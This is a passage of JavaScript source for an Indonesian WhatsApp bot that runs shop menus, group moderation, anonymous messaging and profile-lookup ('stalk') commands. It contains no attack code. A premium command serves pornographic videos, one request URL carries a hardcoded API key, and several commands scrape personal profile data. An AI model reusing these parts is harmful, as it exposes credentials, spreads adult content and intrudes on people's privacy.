    return GpStore.sendButtonText(m.chat, buttons, teks, `𝘉𝘺 𝘒𝘳𝘪𝘴𝘏𝘰𝘴𝘵𝘪𝘯𝘨:(`, m)
}

if (/hehe/g.test(m.body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
GpStore.relayMessage(m.chat, { reactionMessage }, { messageId: "ppppp" })
}

if (autodltt) {
if (/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/.test(body) && !body.startsWith(prefix)) {
url = body.match(/(?:http(?:s|):\/\/|)(?:www\.|)(?:tiktok.com)\/@([-_0-9A-Za-z\.]{3,20})\/video\/([0-9]{19,25})?.(?:sender_device=pc&sender_web_id=[0-9]{19,25})&.(?:s_from_webapp=v1&is_copy_url=[0-9]{1})|(?:http(?:s|)):\/\/(?:(?:vt.|vm.)tiktok.com)\/(?:[a-z0-9A-Z]{9,15}\/)|(?:http(?:s|)):\/\/(?:t.tiktok.com)\/(?:i18n\/share\/video)\/([&\?\/a-zA-Z0-9=_-]{333,400})/)[0] 
let atdl = await tiktokdl(url)
let buttons = [
{ buttonId: `.tiktokvideo ${url}`, buttonText: { displayText: 'Video' }, type: 1 },
{ buttonId: `.tiktokaudio ${url}`, buttonText: { displayText: 'Audio' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Auto Download Tiktok

Title : ${atdl.title}`, `Auto Downloader By GpStore`, ftext)
}
}

if (autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let media = await quoted.download()
let encmedia = await GpStore.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await GpStore.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
GpStore.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antilinkyt) {
if (chath.match(/(youtu.be\/)/gi)) {
reply(`*「 YOUTUBE LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link youtube, maaf kamu akan di kick`)
await GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
}

if (m.isGroup && !m.key.fromMe && !itsMeGpStore && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
GpStore.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
GpStore.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
GpStore.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
GpStore.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadykaylaList(chath, dblist)) {
var getkaydata = getDatakaylaList(chath, dblist)
if (getkaydata.isImage === false) {
GpStore.sendMessage(m.chat, { text: sendkaylaList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getkaydata.image_url)
GpStore.sendImage(m.chat, buff, `${getkaydata.response}`, m)
}
}

const seactions = [{
title: `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇`,
rows: [
{title: `𝗔𝗟𝗟 𝗠𝗘𝗡𝗨`, rowId: `${prefix}all`},
{title: `𝗣𝗔𝗞𝗘𝗧 𝗗𝗔𝗧𝗔`, rowId: `${prefix}paketdata`},
{title: `𝗧𝗢𝗣𝗨𝗣 𝗠𝗘𝗡𝗨`, rowId: `${prefix}topup`},
]}]
const listMessage = { 
text: `Silahkan @${sender.split("@")[0]} Pilih List  DI Bawah`,
mentions: [sender],
footer: fake,
buttonText: 'LIST ',
sections: seactions,
listType: 1}

switch (command) {
case 'shutdown':
if (!itsMeGpStore) return reply(mess.owner)
reply(`Bye...`)
await sleep(3000)
process.exit()
break
case 'owner':{
const repf = await GpStore.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, mentions: [sender] }, { quoted: m })
GpStore.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
}
break
case 'caridoi':
case 'cariteman':
if (!isPrem) return replyprem(mess.premium)
let teman = pickRandom(pendaftar)
setTimeout(() => {
reply('Sedang Mencari....')
}, 1000)
setTimeout(() => {
reply('Berhasil Mendapatkan Satu Orang')
}, 5000)
setTimeout(() => {
GpStore.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
break
case 'sc': case 'scriptbot': case 'scbot':{
GpStore.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await GpStore.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
case 'menu':{
const seactiones = [
{
 title: "⚠︎  𝙻𝙸𝚂𝚃 𝙼𝙴𝙽𝚄 « ✧",
                rows: [
                {title: "✦  「 𝙋𝙪𝙡𝙨𝙖 𝙉𝙖𝙨𝙞𝙤𝙣𝙖𝙡 」", rowId: `.buypulsa`, description: `╰ ► 👜 𝘔𝘢𝘶 𝘉𝘶𝘺 𝘗𝘶𝘭𝘴𝘢 𝘠𝘢 𝘉𝘳𝘰 :v`},
                {title: "✦  「 𝘼𝙡𝙡 𝙈𝙚𝙣𝙪 」", rowId: `.allmenu`, description: `╰ ► 📹𝘔𝘦𝘯𝘢𝘮𝘪𝘱𝘬𝘢𝘯 𝘚𝘦𝘮𝘶𝘢 𝘔𝘦𝘯𝘶 𝘉𝘰𝘵 🤫`},
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝙀-𝙒𝙖𝙡𝙡𝙚𝙩 」", rowId: `.saldoewallet`, description: `╰ ► 💳 𝘛𝘰𝘱𝘜𝘱 𝘚𝘢𝘭𝘥𝘰 𝘕𝘪𝘩 𝘉𝘢𝘯𝘨? 🤨`},
                {title: "✦  「 𝙆𝙚𝙗𝙪𝙩𝙪𝙝𝙖𝙣 𝙎𝙤𝙨𝙞𝙖𝙡 𝙈𝙚𝙙𝙞𝙖 」", rowId: `.jasasuntik`, description: `╰ ► 📌 𝘔𝘢𝘶 𝘖𝘳𝘥𝘦𝘳 𝘑𝘢𝘴𝘢 𝘚𝘶𝘯𝘵𝘪𝘬 𝘉𝘢𝘯𝘨`},
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝙂𝙖𝙢𝙚 」", rowId: `.topupgame`, description: `╰ ► 💎 𝘔𝘢𝘶 𝘛𝘰𝘱𝘜𝘱 𝘎𝘢𝘮𝘦🗿`},       
                {title: "✦  「 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 」", rowId: `.payment`, description: `╰ ► ❔Random 𝘔𝘢𝘶 𝘉𝘢𝘺𝘢𝘳 𝘕𝘪𝘩`},            
]}]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝙸𝚗𝚒`,
buttonText: '𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 ',
sections: seactiones,
listType: 1}
GpStore.sendMessage(from, listSw, { quoted: m })
}
break
case 'jasasuntik':{
const seactiones = [
{
 title: "⚠︎  𝙺𝙴𝙱𝚄𝚃𝚄𝙷𝙰𝙽 𝚂𝙾𝚂𝙸𝙰𝙻 𝙼𝙴𝙳𝙸𝙰 « ✧",
                rows: [
                {title: "✦  「 𝙅𝙖𝙨𝙖 𝙎𝙪𝙣𝙩𝙞𝙠 𝙏𝙞𝙠𝙏𝙤𝙠 」", rowId: `.suntiktiktok`, description: `╰ ► 📌 𝘔𝘢𝘶 𝘖𝘳𝘥𝘦𝘳 𝘑𝘢𝘴𝘢 𝘚𝘶𝘯𝘵𝘪𝘬 𝘛𝘪𝘬𝘵𝘰𝘬 𝘠𝘢? :v`},
                {title: "✦  「 𝙅𝙖𝙨𝙖 𝙎𝙪𝙣𝙩𝙞𝙠 𝙄𝙂」", rowId: `.suntikig`, description: `╰ ► 📌 𝘔𝘢𝘶 𝘖𝘳𝘥𝘦𝘳 𝘑𝘢𝘴𝘢 𝘚𝘶𝘯𝘵𝘪𝘬 𝘐𝘎 𝘠𝘢? 🤫`},
                {title: "✦  「 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 」", rowId: `.payment`, description: `╰ ► 💳 𝘔𝘢𝘶 𝘉𝘢𝘺𝘢𝘳 𝘠𝘢? 🤨`},      
]}]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝙸𝚗𝚒`,
buttonText: '𝙋𝙄𝙇𝙄𝙃 𝘿𝙄 𝙎𝙄𝙉𝙄',
sections: seactiones,
listType: 1}
GpStore.sendMessage(from, listSw, { quoted: m })
}
break
case 'topupgame':{
const seactiones = [
{
 title: "⚠︎  𝚃𝙾𝙿𝚄𝙿 𝙶𝙰𝙼𝙴 « ✧",
                rows: [
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝙁𝙧𝙚𝙚 𝙁𝙞𝙧𝙚 」", rowId: `.diamondff`, description: `╰ ► 💎 𝘛𝘰𝘱𝘜𝘱 𝘋𝘪𝘢𝘮𝘰𝘯𝘥 𝘍𝘳𝘦𝘦𝘍𝘪𝘳𝘦 𝘉𝘢𝘯𝘨`},
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝙋𝙪𝙗𝙜 𝙈𝙤𝙗𝙞𝙡𝙚 」", rowId: `.diamondpubg`, description: `╰ ► 💎 𝘛𝘰𝘱𝘶𝘱 𝘋𝘪𝘢𝘮𝘰𝘯𝘥 𝘗𝘶𝘣𝘨 𝘔𝘰𝘣𝘪𝘭𝘦`},
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝙈𝙤𝙗𝙞𝙡𝙚 𝙇𝙚𝙜𝙚𝙣𝙙 」", rowId: `.diamondml`, description: `╰ ► 💎 𝘛𝘰𝘱𝘜𝘱 𝘋𝘪𝘢𝘮𝘰𝘯𝘥 𝘔𝘰𝘣𝘪𝘭𝘦 𝘓𝘦𝘨𝘦𝘯𝘥`},
                {title: "✦  「 𝙏𝙤𝙥𝙐𝙥 𝘾𝙖𝙡𝙡 𝙊𝙛 𝘿𝙪𝙩𝙮 」", rowId: `.diamondcalof`, description: `╰ ► 💎 𝘛𝘰𝘱𝘶𝘱 𝘋𝘪𝘢𝘮𝘰𝘯𝘥 𝘊𝘢𝘭𝘭 𝘖𝘧 𝘋𝘶𝘵𝘺 𝘕𝘨𝘢𝘣`},     
]}]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝙸𝚗𝚒`,
buttonText: '𝙏𝙊𝙋𝙐𝙋 𝙂𝘼𝙈𝙀',
sections: seactiones,
listType: 1}
GpStore.sendMessage(from, listSw, { quoted: m })
}
break
case 'payment':{
const seactiones = [
{
 title: "⚠︎  𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙼𝙴𝙽𝚄 « ✧",
                rows: [
                {title: "✦  「 𝙌𝙧𝙞𝙨 」", rowId: `.bayarqris`, description: `╰ ► 𝘉𝘢𝘺𝘢𝘳 𝘓𝘦𝘸𝘢𝘵 𝘘𝘳𝘪𝘴 𝘈𝘭𝘱𝘢𝘺𝘮𝘦𝘯𝘵`},
                {title: "✦  「 𝘿𝙖𝙣𝙖 」", rowId: `.diamondpubg`, description: `╰ ► 💎 𝘉𝘢𝘺𝘢𝘳 𝘓𝘦𝘸𝘢𝘵 𝘋𝘢𝘯𝘢`},
                {title: "✦  「 𝙂𝙤𝙥𝙖𝙮 」", rowId: `.diamondml`, description: `╰ ► 💎 𝘉𝘢𝘺𝘢𝘳 𝘓𝘦𝘸𝘢𝘵 𝘎𝘰𝘱𝘢𝘺`},
                {title: "✦  「 𝙊𝙫𝙤 」", rowId: `.diamondcalof`, description: `╰ ► 𝘉𝘢𝘺𝘢𝘳 𝘓𝘦𝘸𝘢𝘵 𝘖𝘷𝘰 𝘕𝘨𝘢𝘣`},     
]}]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 𝙳𝚒 𝙱𝚊𝚠𝚊𝚑 𝙸𝚗𝚒`,
buttonText: '𝗣𝗔𝗬𝗠𝗘𝗡𝗧',
sections: seactiones,
listType: 1}
GpStore.sendMessage(from, listSw, { quoted: m })
}
break
case 'gttees':
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
const gtts = require('./lib/gtts')(`id`, q)
var bby = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
GpStore.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
fs.unlinkSync(rano)
})
})
break
case 'igstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} kirbotzx`)
aj = await igstalk(`${q}`)
GpStore.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Stalking Instagram \\*

Fullname : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Stalking Freefire \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break    
case 'mlstalk':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} 530793138|8129`)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Stalking Mobile Legengd \\*

Username ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return reply(`Contoh ${prefix+command} kirbotz-api`)
eha = await npmstalk.npmstalk(q)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk':{
if (!q) return reply(`Contoh ${prefix+command} KirBotz`)
aj = await githubstalk.githubstalk(`${q}`)
GpStore.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb':{
if (!q) return reply(`Contoh ${prefix+command} link`)
let krt = await scp1.ssweb(q)
GpStore.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
}
break
case 'join': {
if (!itsMeGpStore) return reply(mess.owner)
if (!text) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await GpStore.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'toonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await GpStore.downloadAndSaveMediaMessage(quoted)
GpStore.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await GpStore.downloadAndSaveMediaMessage(quoted)
GpStore.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'autodltt':
if (!itsMeGpStore) return reply(mess.owner)
if (args[0] == 'on') {
if (autodltt) return reply('*Sudah Aktif!*')
autodltt = true
reply('*Berhasil Mengaktifkan Auto Download Tiktok*')
} else if (args[0] == 'off') {
if (!autodltt) return reply('*Belum Aktif!*')
autodltt = false
reply('*Berhasil Mematikan Auto Download Tiktok*')
} else {
let buttons = [
{ buttonId: '.autodltt on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autodltt off', buttonText: { displayText: 'Off' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
}
break
case 'autosticker':
if (!itsMeGpStore) return reply(mess.owner)
if (args[0] == 'on') {
if (autosticker) return reply('*Sudah Aktif!*')
autosticker = true
reply('*Berhasil Mengaktifkan Autosticker*')
} else if (args[0] == 'off') {
if (!autosticker) return reply('*Belum Aktif!*')
autosticker = false
reply('*Berhasil Mematikan Autosticker*')
} else {
let buttons = [
{ buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
}
break
case 'bc':
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Teks Nya Bang?`)
let anu = await store.chats.all().map(v => v.id)
for (let yoi of anu) {
GpStore.sendMessage(yoi,{text:`INFORMASI
Buat User Bot

${q}`})
}
reply(`Succes`)
break
case 'ban':{
if (!itsMeGpStore) return reply(mess.owner)
if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 62858428854987`)
orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
let ceknye = await GpStore.onWhatsApp(orgnye)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
const isBane = banUser ? banUser.includes(orgnye) : false
if (args[0] === "add") {
if (isBane) return reply('User Sudah Dibanned')
GpStore.updateBlockStatus(orgnye, 'block')
reply(`Succes Ban`)
} else if (args[0] === "del") {
if (!isBane) return reply('User Tidak Dibanned')
GpStore.updateBlockStatus(orgnye, 'unblock')
reply(`Succes Unban`)
} else {
reply("Error")
}
}
break
case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
try {
listBloxk = []
teskd = ``
listnyd = 1
for (let i of banUser) {
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `block del ${i.split("@")[0]}`, description: "ketuk untuk mengunblockir"})
}
teskd += `\n\nketuk button untuk mengunblockir`
const sections = [
{
title: "Total Blockir " + banUser.length,
rows: listBloxk
}
]

const listMessage = {
text: teskd,
footer: fake,
title: "     �? List Participants Blockir �?",
buttonText: "List Blockir",
mentions: await GpStore.parseMention(teskd),
sections
}
GpStore.sendMessage(from, listMessage, {quoted:m})
} catch {
reply("Tidak ada user yang diblockir")
}
}
break
case 'asupan': case 'bocil': case 'rikaGpStoreriani':{
if (!isPrem) return replyprem(mess.premium)
fdy = await fetchJson(`https://kirbotz-api.herokuapp.com/api/random/asupan/${command}?apikey=KirBotz`)
GpStore.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'jadibot': {
if (m.isGroup) return reply(mess.private)
if (!isPrem) return replyprem(mess.premium)
jadibot(GpStore, m, from)
}
break
case 'listjadibot': 
try {
let user = [... new Set([...global.conns.filter(GpStore => GpStore.user).map(GpStore => GpStore.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
y = await GpStore.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
GpStore.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`Belum Ada User Yang Jadibot`)
}
break
case 'hentaivid': {
if (!isPrem) return replyprem(mess.premium)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
GpStore.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `�? Title : ${cejd.title}
�? Category : ${cejd.category}
�? Mimetype : ${cejd.type}
�? Views : ${cejd.views_count}
�? Shares : ${cejd.share_count}
�? Source : ${cejd.link}
�? Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
case 'menfes': case 'confes':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
if (m.isGroup) return reply(mess.private)
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 62858428854987|Hai Owner`)
if (text > 700) return reply(`Teks Kepanjangan`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await GpStore.onWhatsApp(num)
if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
if (num === m.sender) return reply(`Tidak Bisa Menfess Ke Nomor Sendiri!!!`)
if (num === botNumber) return reply(`Tidak Bisa Menfess Ke Nomor bot!!!`)
var nomor = m.sender
let buttons = [
{ buttonId: '.leave', buttonText: { displayText: 'Biarin' }, type: 1 }
]
await GpStore.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
Seseorang Temanmu
(Pengirim Rahasia)

-------------------------------------->

💌 Pesan : ${pesan}

-------------------------------------->`, `PENGIRIM RAHASIA
Anda Ingin Mengirimkan Pesan Ke Pacar/Sahabat/Teman/Doi/Mantan?
Tapi Tidak Ingin Tau Siapa Pengirimnya?
Kamu Bisa Menggunakan Bot Ini
Contoh Penggunaan: ${prefix+command} nomor|pesan untuknya

Contoh: ${prefix+command} 628xxxxxxxx|hai owner`, m)
await GpStore.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : ftext })
lidt = `Sukses Mengirim Pesan
👤 Dari : wa.me/${nomor.split("@s.whatsapp.net")[0]}
👥 Ke : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

⬡──⬡─────────⬡──�?

Isi Pesan : ${pesan}

⬡──⬡─────────⬡──⬡`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ANONYMOUS] Creating room for: " + sender);
return reply(lidt)
}
break
case 'leave':{
if (m.isGroup && itsMeGpStore && command == "leave") return GpStore.groupLeave(from)
if (m.isGroup) return reply("Only private chat")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return reply("Anda tidak berada didalam room")
reply("Bye...")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") GpStore.sendMessage(other, {
text: "Bye..."
})
if (command == "leave") break;
}
case 'afk': {
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Contoh ${prefix+command} pengen turu`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
m.reply(`${m.pushName} sekarang afk\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'antilink':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
let buttons = [
{ buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
}
break
case 'welcome':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (welcome) return reply('*Sudah Aktif!*')
welcome = true
reply('*Berhasil Mengaktifkan welcome*')
} else if (args[0] == 'off') {
if (!welcome) return reply('*Belum Aktif!*')
welcome = false
reply('*Berhasil Mematikan welcome*')
} else {
let buttons = [
{ buttonId: '.welcome on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.welcome off', buttonText: { displayText: 'Off' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Mode welcome`, `Pilih On Atau Off`, m)
}
break
case 'antiwame':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[0] == 'on') {
if (antiwame) return reply('*Sudah Aktif!*')
antiwame = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antiwame) return reply('*Belum Aktif!*')
antiwame = false
reply('*Berhasil Mematikan Antilink*')
} else {
let buttons = [
{ buttonId: '.antiwame on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: '.antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
]
await GpStore.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await GpStore.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'closetime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
